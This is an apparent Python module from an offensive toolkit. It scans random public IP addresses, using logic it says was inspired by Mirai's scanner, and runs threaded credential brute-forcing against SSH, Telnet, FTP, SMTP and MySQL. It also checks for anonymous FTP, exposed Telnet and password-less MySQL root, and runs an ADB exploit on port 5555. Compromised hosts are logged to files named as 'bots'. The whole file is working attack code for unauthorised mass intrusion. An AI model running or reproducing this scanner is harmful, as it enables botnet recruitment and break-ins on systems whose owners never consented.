import os,sys,socket,random,time,threading,smtplib,telnetlib
from bane.payloads import *
from bane.vulns import adb_exploit,exposed_telnet
from ftplib import FTP
linux=True
if os.path.isdir('/data/data')==True:
    adr=True
if os.path.isdir('/data/data/com.termux/')==True:
    termux=True
wido=False
if (sys.platform == "win32") or( sys.platform == "win64"):
 wido=True
if ((wido==True) or (linux==True)):
 from bane.sshbf import *
import mysql.connector as mconn
from bane.bruteforcer import *
from bane.extrafun import create_file,write_file
def getip():
 '''
   this function was inspired by the scanning file in mirai's source code to returns a safe IP to bruteforce.
'''
 d=[3,6,7,10,11,15,16,21,22,23,26,28,29,30,33,55,56,127,214,215]
 f=[100,169,172,198]
 while True:
  o1=random.randint(1,253)
  o2=random.randint(0,254)
  if (o1 not in d):
   if o1 in f:
    if ((o1==192)and(o2!=168)):
     return '{}.{}.{}.{}'.format(o1,o2,random.randint(0,255),random.randint(0,255))
    if ((o2==172)and((o2<=16)and(o2>=32))):
     return '{}.{}.{}.{}'.format(o1,o2,random.randint(0,255),random.randint(0,255))
    if((o1==100)and(o2!=64)):
     return '{}.{}.{}.{}'.format(o1,o2,random.randint(0,255),random.randint(0,255))
    if((o1==169)and (o2!=254)):
     return '{}.{}.{}.{}'.format(o1,o2,random.randint(0,255),random.randint(0,255))
    if((o1==198)and(o2!=18)):
     return '{}.{}.{}.{}'.format(o1,o2,random.randint(0,255),random.randint(0,255))
   else:
    return '{}.{}.{}.{}'.format(o1,o2,random.randint(0,255),random.randint(0,255))
'''
  the following functions are used to scan safe IPs all over the internet with a wordlist, it can scan bruteforce their: ftp, ssh, telnet, smtp and mysql logins then save them on text files in the same directory.
  it's highly recommended to be used with a VPS or your slow internet speed will be an obstacle to your scan.
'''
class iots(threading.Thread):
 def run(self):
  self.ip_seg=ip_seg
  while (stop!=True):
   if self.ip_seg==None:
     ip=getip()
   else:
     ip=self.ip_seg.format(random.randint(0,255),random.randint(0,255),random.randint(0,255),random.randint(0,255))
   i=False
   try:
    so=socket.socket()
    so.settimeout(3)
    so.connect((ip,22))
    i=True
   except Exception as ex: 
    pass
   if i==True:
    for x in wordlist:
     try:
      username=x.split(':')[0]
      password=x.split(':')[1]
      if wido==True:
       q=ssh_win(ip,username=username,password=password)
      elif termux==True:
       q=ssh_andro(ip,username=username,password=password)
      else:
       q=ssh_linux(ip,username=username,password=password)
      if q==True:
       ip+=':'+username+':'+password
       print (ip)
       write_file(ip,filen)
     except Exception as e: 
      pass
def mass_ssh(threads=100,word_list=wordlist,filename='ssh_bots.txt',ip_range=None):
 global stop
 stop=False
 global ip_seg
 ip_seg=ip_range
 create_file(filename)
 global filen
 filen=filename
 global wordlist
 wordlist=word_list
 thr=[]
 for x in range(threads):
  try:
   t=iots().start()
   thr.append(t)
  except:
   pass
 while (stop!=True):
  try:
    time.sleep(.1)
  except KeyboardInterrupt:
    stop=True
    break
 for x in thr:
    try:
      x.join(1)
    except Exception as e:
      pass
    del x
class iott(threading.Thread):
 def run(self):
  self.ip_seg=ip_seg
  while (stop!=True):
   if self.ip_seg==None:
     ip=getip()
   else:
     ip=self.ip_seg.format(random.randint(0,255),random.randint(0,255),random.randint(0,255),random.randint(0,255))
   i=False
   try:
    so=socket.socket()
    so.settimeout(3)
    so.connect((ip,23))
    i=True
   except Exception as ex: 
    pass
   if i==True:
    for x in wordlist:
     try:
      username=x.split(':')[0]
      password=x.split(':')[1]
      q= telnet(ip,username=username,password=password)
      if q==True:
       ip+=':'+username+':'+password
       print (ip)
       write_file(ip,filen)
     except Exception as e: 
      pass
def mass_telnet(threads=500,word_list=wordlist,filename='telnet_bots.txt',ip_range=None):
 global stop
 stop=False
 global ip_seg
 ip_seg=ip_range
 create_file(filename)
 global filen
 filen=filename
 global wordlist
 wordlist=word_list
 thr=[]
 for x in range(threads):
  try:
   t=iott().start()
   thr.append(t)
  except:
   pass
 while (stop!=True):
  try:
    time.sleep(.1)
  except KeyboardInterrupt:
    stop=True
    break
 for x in thr:
    try:
      x.join(1)
    except Exception as e:
      pass
    del x
class iotelt(threading.Thread):
 def run(self):
  self.ip_seg=ip_seg
  while (stop!=True):
   if self.ip_seg==None:
     ip=getip()
   else:
     ip=self.ip_seg.format(random.randint(0,255),random.randint(0,255),random.randint(0,255),random.randint(0,255))
   i=False
   try:
    so=socket.socket()
    so.settimeout(3)
    so.connect((ip,23))
    i=True
   except Exception as ex: 
    pass
   if i==True:
     try:
      q= exposed_telnet(ip)
      if q==True:
       print (ip)
       write_file(ip,filen)
     except Exception as e: 
      pass
def mass_exposed_telnet(threads=500,filename='exposed_telnet_bots.txt',ip_range=None):
 global stop
 stop=False
 global ip_seg
 ip_seg=ip_range
 create_file(filename)
 global filen
 filen=filename
 global wordlist
 wordlist=word_list
 thr=[]
 for x in range(threads):
  try:
   t=iotelt().start()
   thr.append(t)
  except:
   pass
 while (stop!=True):
  try:
    time.sleep(.1)
  except KeyboardInterrupt:
    stop=True
    break
 for x in thr:
    try:
      x.join(1)
    except Exception as e:
      pass
    del x
class iotf1(threading.Thread):
 def run(self):
  self.ip_seg=ip_seg
  while (stop!=True):
   if self.ip_seg==None:
     ip=getip()
   else:
     ip=self.ip_seg.format(random.randint(0,255),random.randint(0,255),random.randint(0,255),random.randint(0,255))
   i=False
   try:
    so=socket.socket()
    so.settimeout(3)
    so.connect((ip,21))
    i=True
   except Exception as ex: 
    pass
   if i==True:
    for x in wordlist:
     try:
      username=x.split(':')[0]
      password=x.split(':')[1]
      if ftp(ip,username=username,password=password)==True:
       ip+=':'+username+':'+password
       print (ip)
       write_file(ip,filen)
     except Exception as e: 
      pass
def mass_ftp(threads=100,meth=1,word_list=wordlist,filename='ftp_bots.txt',ip_range=None):
 global ip_seg
 ip_seg=ip_range
 global stop
 stop=False
 create_file(filename)
 global filen
 filen=filename
 global wordlist
 wordlist=word_list
 thr=[]
 for x in range(threads):
  try:
   t=iotf1().start()
   thr.append(t)
  except:
   pass
 while (stop!=True):
  try:
    time.sleep(.1)
  except KeyboardInterrupt:
    stop=True
    break
 for x in thr:
    try:
      x.join(1)
    except Exception as e:
      pass
    del x
class iotf2(threading.Thread):
 def run(self):
  self.ip_seg=ip_seg
  while (stop!=True):
   if self.ip_seg==None:
     ip=getip()
   else:
     ip=self.ip_seg.format(random.randint(0,255),random.randint(0,255),random.randint(0,255),random.randint(0,255))
   i=False
   try:
    so=socket.socket()
    so.settimeout(3)
    so.connect((ip,21))
    i=True
   except Exception as ex: 
    pass
   if i==True:
     try:
      if ftp_anon(ip)==True:
       print (ip)
       write_file(ip,filen)
     except Exception as e: 
      pass
def mass_ftp_anon(threads=100,filename='ftp_anon_bots.txt',ip_range=None):
 global ip_seg
 ip_seg=ip_range
 global stop
 stop=False
 create_file(filename)
 global filen
 filen=filename
 thr=[]
 for x in range(threads):
  try:
   t=iotf2().start()
   thr.append(t)
  except:
   pass
 while (stop!=True):
  try:
    time.sleep(.1)
  except KeyboardInterrupt:
    stop=True
    break
 for x in thr:
    try:
      x.join(1)
    except Exception as e:
      pass
    del x
class iotsm(threading.Thread):
 def run(self):
  self.ip_seg=ip_seg
  while (stop!=True):
   if self.ip_seg==None:
     ip=getip()
   else:
     ip=self.ip_seg.format(random.randint(0,255),random.randint(0,255),random.randint(0,255),random.randint(0,255))
   try:
    so=socket.socket()
    so.settimeout(3)
    so.connect((ip,25))
    i=True
   except Exception as ex: 
    pass
   if i==True:
    for x in wordlist:
     try:
      username=x.split(':')[0]
      password=x.split(':')[1]
      if smtp(ip,username=username,password=password)==True:
       ip+=':'+username+':'+password
       print (ip)
       write_file(ip,filen)
     except Exception as e: 
      pass
def mass_smtp(o,threads=100,word_list=wordlist,filename='smtp_bots.txt',ip_range=None):
 global ip_seg
 ip_seg=ip_range
 global stop
 stop=False
 create_file(filename)
 global filen
 filen=filename
 global octet
 octet=o
 global wordlist
 wordlist=word_list
 thr=[]
 for x in range(threads):
  try:
   t=iotsm().start()
   thr.append(t)
  except:
   pass
 while (stop!=True):
  try:
    time.sleep(.1)
  except KeyboardInterrupt:
    stop=True
    break
 for x in thr:
    try:
      x.join(1)
    except Exception as e:
      pass
    del x
class iotmy(threading.Thread):
 def run(self):
  self.ip_seg=ip_seg
  while (stop!=True):
   if self.ip_seg==None:
     ip=getip()
   else:
     ip=self.ip_seg.format(random.randint(0,255),random.randint(0,255),random.randint(0,255),random.randint(0,255))
   i=False
   try:
    so=socket.socket()
    so.settimeout(3)
    so.connect((ip,3306))
    i=True
   except Exception as ex: 
    pass
   if i==True:
    for x in wordlist:
     try:
      username=x.split(':')[0]
      password=x.split(':')[1]
      if mysql(ip,username=username,password=password)==True:
       ip+=':'+username+':'+password
       print (ip)
       write_file(ip,filen)
     except Exception as e: 
      pass
def mass_mysql(threads=100,word_list=wordlist,filename='mysql_bots.txt',ip_range=None):
 global ip_seg
 ip_seg=ip_range
 global stop
 stop=False
 create_file(filename)
 global filen
 filen=filename
 global wordlist
 wordlist=word_list
 thr=[]
 for x in range(threads):
  try:
   t=iotmy().start()
   thr.append(t)
  except:
   pass
 while (stop!=True):
  try:
    time.sleep(.1)
  except KeyboardInterrupt:
    stop=True
    break
 for x in thr:
    try:
      x.join(1)
    except Exception as e:
      pass
    del x
class iotmy2(threading.Thread):
 def run(self):
  s=mysql
  self.ip_seg=ip_seg
  while (stop!=True):
   if self.ip_seg==None:
     ip=getip()
   else:
     ip=self.ip_seg.format(random.randint(0,255),random.randint(0,255),random.randint(0,255),random.randint(0,255))
   i=False
   try:
    so=socket.socket()
    so.settimeout(3)
    so.connect((ip,3306))
    i=True
   except Exception as ex: 
    pass
   if i==True:
     try:
      if mysql(ip)==True:
       ip+=':root:'
       print (ip)
       write_file(ip,filen)
     except Exception as e: 
      pass
def mass_mysql_default(threads=100,word_list=wordlist,filename='mysql_default_bots.txt',ip_range=None):
 global ip_seg
 ip_seg=ip_range
 global stop
 stop=False
 create_file(filename)
 global filen
 filen=filename
 global wordlist
 wordlist=word_list
 thr=[]
 for x in range(threads):
  try:
   t=iotmy2().start()
   thr.append(t)
  except:
   pass
 while (stop!=True):
  try:
    time.sleep(.1)
  except KeyboardInterrupt:
    stop=True
    break
 for x in thr:
    try:
      x.join(1)
    except Exception as e:
      pass
    del x
class iotadb(threading.Thread):
 def run(self):
  self.ip_seg=ip_seg
  while (stop!=True):
   if self.ip_seg==None:
     ip=getip()
   else:
     ip=self.ip_seg.format(random.randint(0,255),random.randint(0,255),random.randint(0,255),random.randint(0,255))
   i=False
   try:
    so=socket.socket()
    so.settimeout(3)
    so.connect((ip,5555))
    i=True
   except Exception as ex: 
    pass
   if i==True:
     try:
      q=adb_exploit(ip)
      if q==True:
       print (ip)
       write_file(ip,filen)
     except Exception as e: 
      pass
def mass_adb(threads=100,word_list=wordlist,filename='adb_bots.txt',ip_range=None):
 global ip_seg
 ip_seg=ip_range
 global stop
 stop=False
 create_file(filename)
 global filen
 filen=filename
 global wordlist
 wordlist=word_list
 thr=[]
 for x in range(threads):
  try:
   t=iotadb().start()
   thr.append(t)
  except:
   pass
 while (stop!=True):
  try:
    time.sleep(.1)
  except KeyboardInterrupt:
    stop=True
    break
 for x in thr:
    try:
      x.join(1)
    except Exception as e:
      pass
    del x
